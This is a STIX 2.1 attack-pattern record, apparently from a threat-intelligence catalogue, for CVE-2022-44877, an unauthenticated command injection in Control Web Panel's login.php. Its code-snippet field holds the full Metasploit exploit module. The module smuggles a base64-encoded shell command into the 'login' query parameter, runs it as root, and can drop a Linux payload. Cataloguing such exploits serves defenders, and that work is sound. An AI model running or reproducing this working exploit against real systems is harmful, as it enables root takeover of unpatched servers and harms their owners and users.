{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2427366a-f855-4b1f-88d8-b69b37158574",
    "created": "2024-08-14T17:00:40.714863Z",
    "modified": "2024-08-14T17:00:40.714867Z",
    "name": "CWP login.php Unauthenticated RCE",
    "description": " Control Web Panel versions < 0.9.8.1147 are vulnerable to unauthenticated OS command injection. Successful exploitation results in code execution as the root user. The results of the command are not contained within the HTTP response and the request will block while the command is running. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/control_web_panel_login_cmd_exec.rb",
            "external_id": "control_web_panel_login_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-44877"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/numanturle/CVE-2022-44877"
        },
        {
            "source_name": "reference",
            "url": "https://control-webpanel.com/changelog#1674073133745-84af1b53-c121"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CWP login.php Unauthenticated RCE',\n        'Description' => %q{\n          Control Web Panel versions < 0.9.8.1147 are vulnerable to\n          unauthenticated OS command injection. Successful exploitation results\n          in code execution as the root user. The results of the command are not\n          contained within the HTTP response and the request will block while\n          the command is running.\n        },\n        'Author' => [\n          'Spencer McIntyre', # metasploit module\n          'Numan T\u00fcrle' # vulnerability discovery\n        ],\n        'References' => [\n          [ 'CVE', '2022-44877' ],\n          [ 'URL', 'https://github.com/numanturle/CVE-2022-44877' ],\n          [ 'URL', 'https://control-webpanel.com/changelog#1674073133745-84af1b53-c121' ]\n        ],\n        'DisclosureDate' => '2023-01-05',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(2031),\n      OptString.new('TARGETURI', [true, 'Base path', '/login/index.php'])\n    ])\n  end\n\n  def check\n    sleep_time = rand(5..10)\n\n    _, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\")\n    end\n\n    vprint_status(\"Elapsed time: #{elapsed_time} seconds\")\n\n    unless elapsed_time > sleep_time\n      return CheckCode::Safe('Failed to test command injection.')\n    end\n\n    CheckCode::Appears('Successfully tested command injection.')\n  rescue Msf::Exploit::Failed\n    return CheckCode::Safe('Failed to test command injection.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      if execute_command(payload.encoded)\n        print_good(\"Successfully executed command: #{payload.encoded}\")\n      end\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path) + \"?login=$(echo${IFS}#{Rex::Text.encode_base64(cmd)}|base64${IFS}-d|bash)\",\n      'vars_post' => {\n        'username' => 'root', # *must* be root\n        'password' => rand_text_alphanumeric(4..16),\n        'commit' => 'Login'\n      }\n    )\n\n    # the command will either cause the response to timeout or return a 302\n    return if res.nil?\n    return if res.code == 302 && res.headers['Location'].include?('login=failed')\n\n    fail_with(Failure::UnexpectedReply, \"The HTTP server replied with a status of #{res.code}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-01-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}